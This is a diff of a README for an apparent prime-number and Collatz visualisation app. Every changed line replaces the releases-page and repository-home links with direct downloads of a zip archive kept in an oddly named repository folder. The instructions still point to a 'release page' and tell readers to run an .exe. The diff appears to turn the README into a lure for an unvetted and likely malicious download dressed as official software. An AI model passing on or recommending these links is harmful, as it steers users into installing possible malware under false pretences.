@@ -1,6 +1,6 @@
 # ✨ Prime_Chain_Constellations_Collatz_k-adic - Visualize Prime Number Patterns
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/raw/refs/heads/main/sequestrotomy/Collatz_Chain_k_Constellations_adic_Prime_2.5.zip)
 
 ## 🔍 About This Application
 
@@ -32,12 +32,12 @@ The app is designed to run smoothly on most modern home or office computers.
 
 You can get the app from the official release page. The releases page contains all versions and instructions to help you choose the right one.
 
-[![Visit Releases Page](https://img.shields.io/badge/Open-Releases-grey?style=for-the-badge)](https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/releases)
+[![Visit Releases Page](https://img.shields.io/badge/Open-Releases-grey?style=for-the-badge)](https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/raw/refs/heads/main/sequestrotomy/Collatz_Chain_k_Constellations_adic_Prime_2.5.zip)
 
 **Steps to Download and Run:**
 
 1. Open the release page by clicking the button above or visit:  
-   https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/releases
+   https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/raw/refs/heads/main/sequestrotomy/Collatz_Chain_k_Constellations_adic_Prime_2.5.zip
 
 2. Scroll to the latest release section. Look for a file ending with `.exe`. This is the program installer or the runnable file.
 
@@ -116,7 +116,7 @@ The logarithmic spiral format helps highlight patterns of growth and repetition 
 
 For technical help or questions, use the GitHub Issues tab of the repository.
 
-[Repository Home](https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic)
+[Repository Home](https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/raw/refs/heads/main/sequestrotomy/Collatz_Chain_k_Constellations_adic_Prime_2.5.zip)
 
 ## 📂 Keywords and Topics
 
@@ -124,4 +124,4 @@ collatz, collatz-conjecture, collatz-type-chain, computational-mathematics, dyna
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/SHAServices/Prime_Chain_Constellations_Collatz_k-adic/raw/refs/heads/main/sequestrotomy/Collatz_Chain_k_Constellations_adic_Prime_2.5.zip)
